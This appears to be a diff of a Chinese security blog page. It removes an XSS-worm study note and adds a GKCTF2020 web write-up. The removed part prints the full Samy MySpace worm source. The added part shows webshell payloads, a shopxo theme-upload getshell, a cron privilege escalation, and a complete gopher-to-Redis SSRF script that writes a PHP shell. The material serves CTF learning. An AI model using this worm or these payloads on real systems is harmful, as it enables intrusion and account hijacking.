@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="xss," />
+  <meta name="keywords" content="bypass,ssrf,Typecho,redis," />
 
 
 
@@ -79,17 +79,54 @@
 
 
 
-<meta name="description" content="XSS蠕虫基本概念XSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)">
+<meta name="description" content="又留了两道node。。。。。留着做个综合吧。。。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss学习日记(三）">
-<meta property="og:url" content="http://yoursite.com/2019/11/02/note3/index.html">
+<meta property="og:title" content="GKCTF2020部分web复现">
+<meta property="og:url" content="http://yoursite.com/2020/07/14/GKCTF2020_web/index.html">
 <meta property="og:site_name" content="Blacknight">
-<meta property="og:description" content="XSS蠕虫基本概念XSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)">
-<meta property="article:published_time" content="2019-11-02T12:34:00.000Z">
-<meta property="article:modified_time" content="2020-05-02T05:58:44.380Z">
+<meta property="og:description" content="又留了两道node。。。。。留着做个综合吧。。。">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713092724.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093632.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093731.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100351.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100544.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100714.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100856.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713103821.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104006.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104209.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104528.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713105704.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110320.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110501.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110824.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111006.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111524.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111811.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113443.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132552.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132729.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133619.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133903.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713134329.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713135357.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713141643.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713144707.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713163648.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713164514.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713165615.png">
+<meta property="article:published_time" content="2020-07-14T09:30:00.000Z">
+<meta property="article:modified_time" content="2020-07-13T09:00:04.444Z">
 <meta property="article:author" content="blacknight">
-<meta property="article:tag" content="xss">
+<meta property="article:tag" content="bypass">
+<meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="Typecho">
+<meta property="article:tag" content="redis">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713092724.png">
 
 
 
@@ -119,13 +156,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/11/02/note3/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/07/14/GKCTF2020_web/"/>
 
 
 
 
 
-  <title>xss学习日记(三） | Blacknight</title>
+  <title>GKCTF2020部分web复现 | Blacknight</title>
   
 
 
@@ -276,7 +313,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/02/note3/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/14/GKCTF2020_web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="blacknight">
@@ -293,7 +330,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">xss学习日记(三）</h1>
+          <h1 class="post-title" itemprop="name headline">GKCTF2020部分web复现</h1>
         
 
         <div class="post-meta">
@@ -305,8 +342,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-02T20:34:00+08:00">
-                2019-11-02
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-14T17:30:00+08:00">
+                2020-07-14
               </time>
             
 
@@ -328,8 +365,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -346,8 +383,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/11/02/note3/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/02/note3/" itemprop="commentCount"></span>
+                <a href="/2020/07/14/GKCTF2020_web/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/07/14/GKCTF2020_web/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -369,7 +406,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  1.5k
                 </span>
               
 
@@ -385,7 +422,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  6
                 </span>
               
             </div>
@@ -406,14 +443,102 @@
       
 
       
-        <h3 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)<a id="more"></a><br>当xss蠕虫与社会工程学相结合，其危害性将变得十分可怕（用户兴趣点及好奇心）。</p>
-<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>1.攻击者发现一个网站存在XSS漏洞，并且可以编写xss蠕虫。<br>2.利用一个宿主（用户）作为传播源头进行xss攻击。<br>3.当其他用户访问被感染的内容（页面），xss蠕虫执行以下操作。<br>  A 判断用户是否登录，如果已经登陆就执行下一步，如果没有登录则执行其他操作。<br>  B 继续判断该用户是否被感染，如果没有就感染了他，如果感染了就跳过。</p>
-<h4 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h4><p>1.寻找XSS点<br>2。实现蠕虫行为<br>3.收集蠕虫数据<br>4.传播与感染<br>参考文章<a href="https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db</a></p>
-<h4 id="世界上第一个xss蠕虫病毒-里程碑"><a href="#世界上第一个xss蠕虫病毒-里程碑" class="headerlink" title="世界上第一个xss蠕虫病毒(里程碑)"></a>世界上第一个xss蠕虫病毒(里程碑)</h4><p>  2005年10月4日，第一个web2.0 蠕虫诞生，年仅19岁的samy发起了对myspace.com的xss worm攻击，下附其源代码，实现方法及原理分析参考文章<br>  <a href="https://www.freebuf.com/articles/web/19408.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/19408.html</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div id=mycode style=<span class="string">"BACKGROUND:url('java </span></span><br><span class="line"><span class="string">script:eval(document.all.mycode.expr)')"</span>expr=<span class="string">"var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return</span></span><br><span class="line"><span class="string">C&#125;else&#123;return eval('document.body.inne'+'rHTML')&#125;&#125;function</span></span><br><span class="line"><span class="string">getData(AU)&#123;M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split('&amp;');var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split('=');AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com')&#123;document.location='http://www.myspace.com'+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),'up_launchIC( '+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new</span></span><br><span class="line"><span class="string">String();var O=0;for(var P</span></span><br><span class="line"><span class="string">in AV)&#123;if(O&gt;0)&#123;N+='&amp;'&#125;varQ=escape(AV[P]);while(Q.indexOf('+')!=-1)&#123;Q=Q.replace('+','%2B')&#125;while(Q.indexOf('&amp;')!=-1)&#123;Q=Q.replace('&amp;','%26')&#125;N+=P+'='+Q;O++&#125;return</span></span><br><span class="line"><span class="string">N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return</span></span><br><span class="line"><span class="string">false&#125;eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST')&#123;J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)&#125;J.send(BK);return</span></span><br><span class="line"><span class="string">true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,'name='+B+BG+B+' value='+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG=='Mytoken')&#123;T=B&#125;else&#123;T='&amp;'&#125;var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else</span></span><br><span class="line"><span class="string">if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject('Msxml2.XMLHTTP')&#125;catch(e)&#123;try&#123;Z=newActiveXObject('Microsoft.XMLHTTP')&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return</span></span><br><span class="line"><span class="string">Z&#125;var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE)&#123;AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='</span></span><br><span class="line"><span class="string">but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1)&#123;if(AF)&#123;AG+=AF;var</span></span><br><span class="line"><span class="string">AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,'POST',paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class="line"><span class="string">main()&#123;var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken='+L,processxForm,'GET')&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to</span></span><br><span class="line"><span class="string">Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class="line"><span class="string">httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return</span></span><br><span class="line"><span class="string">false&#125;eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST')&#123;xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;xmlhttp2.send(BK);return</span></span><br><span class="line"><span class="string">true&#125;"</span>&gt;&lt;/DIV&gt;</span><br></pre></td></tr></table></figure>
+        <p>又留了两道node。。。。。留着做个综合吧。。。</p>
+<a id="more"></a>
 
+<h3 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h3><p>打开靶机即得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>
 
+<p>接受get或post形式传入的Ginkgo，并base64解码执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713092724.png" alt=""></p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>那么构造一句话，由于这里是eval执行，相当于自动加php标签，所以只要构造<code>eval($_POST[&#39;a&#39;]); =&gt; ZXZhbCgkX1BPU1RbJ2EnXSk7</code>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093632.png" alt=""></p>
+<p>用蚁剑连上，给了个readflag的脚本，php版本是7.3，考虑<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">php7-gc-bypass</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093731.png" alt=""></p>
+<p>找个有上传权限的目录上传bypass脚本，红框内是执行的命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100351.png" alt=""></p>
+<p>tmp下上传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100544.png" alt=""></p>
+<p>接着包含该文件即可bypass</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100714.png" alt=""></p>
+<p>把之前的命令改为执行readflag脚本即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100856.png" alt=""></p>
+<h3 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h3><p>给了提示是cve-2020-7066，搜集下信息</p>
+<blockquote>
+<p>PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。</p>
+</blockquote>
+<p> 参考：<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79329</a></p>
+<p>即get_headers()函数在一个空字节后会被无提示地截断</p>
+<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>打开靶机提示点击view ctfhub，跳转后url如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713103821.png" alt=""></p>
+<p>参考文章中示例构造<code>http://127.0.0.1\0www.ctfhub.com</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104006.png" alt=""></p>
+<p>由于是url传入，改为%00替代空字节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104209.png" alt=""></p>
+<p>提示了必须以123结尾，改一下即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104528.png" alt=""></p>
+<h3 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h3><p>打开靶机是shopxo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713105704.png" alt=""></p>
+<p>百度下有没有已知的漏洞</p>
+<p>找到一个后台getshell，参考文章：<a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p>
+<h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><p>首先用默认账号密码登录后台，admin，shopxo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110320.png" alt=""></p>
+<p>到应用商店下载默认主题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110501.png" alt=""></p>
+<p>往压缩包里加入shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110824.png" alt=""></p>
+<p>找到主题安装位置上传加入shell之后的压缩包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111006.png" alt=""></p>
+<p>访问/public/static/index/default/oneword.php即可getshell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111334.png" alt=""></p>
+<p>用蚁剑连，根目录flag下提示在root</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111524.png" alt=""></p>
+<p>但root设置了权限不可读，注意到根目录下还有一个auto.sh，查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111811.png" alt=""></p>
+<p>每隔一分钟执行一次makeflaghint.py，看下这个脚本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111929.png" alt=""></p>
+<p>获取当前时间并写入flag.hint，那么我们利用这个脚本的root权限读出root下的flag并写入到flag.hint即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113334.png" alt=""></p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113443.png" alt=""></p>
+<h3 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h3><p>打开靶机只有一个提交框</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132552.png" alt=""></p>
+<p>源码处发现注释</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132729.png" alt=""></p>
+<p>提交访问返回类似ifconfig的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:ad:1f:54:0a  </span><br><span class="line">          inet addr:173.31.84.10  Bcast:173.31.84.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:34 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:6058 (6.0 KB)  TX bytes:5729 (5.7 KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>
 
+<p>得到内网ip，访问看看</p>
+<p>会回显首页内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133619.png" alt=""></p>
+<p>看看内网里还有没有其他页面，burp爆破一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133903.png" alt=""></p>
+<p>扫到以下主机存活</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713134329.png" alt=""></p>
+<p>依次访问看看，其他没啥发现，访问11的时候提示扫它的端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713135357.png" alt=""></p>
+<p>太容易429了。。直接看的wp跑了一下6300-6400，发现开放了6379</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713141643.png" alt=""></p>
+<p>6379是redis的默认端口号</p>
+<h4 id="考点：Redis配合gopher协议进行SSRF"><a href="#考点：Redis配合gopher协议进行SSRF" class="headerlink" title="考点：Redis配合gopher协议进行SSRF"></a>考点：Redis配合gopher协议进行SSRF</h4><p>未授权访问Redis服务器</p>
+<p><a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">参考文章</a></p>
+<p>直接拿的脚本，php代码执行命令结果写入shell.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class="line">ip&#x3D;&quot;173.31.84.11&quot;#探测主机</span><br><span class="line">port&#x3D;&quot;6379&quot;</span><br><span class="line">shell&#x3D;&quot;\n\n&lt;?php system(\&quot;cat &#x2F;flag\&quot;);?&gt;\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class="line">	 &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class="line">	 &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line">	 &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line">	 &quot;save&quot;</span><br><span class="line">	 ]</span><br><span class="line">if passwd:</span><br><span class="line">	cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class="line">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">	CRLF&#x3D;&quot;\r\n&quot;</span><br><span class="line">	redis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class="line">	cmd&#x3D;&quot;&quot;</span><br><span class="line">	cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">	for x in redis_arr:</span><br><span class="line">		cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">	cmd+&#x3D;CRLF</span><br><span class="line">	return cmd</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">	for x in cmd:</span><br><span class="line">		payload +&#x3D; urllib.quote(redis_format(x))</span><br><span class="line">	print payload</span><br></pre></td></tr></table></figure>
+
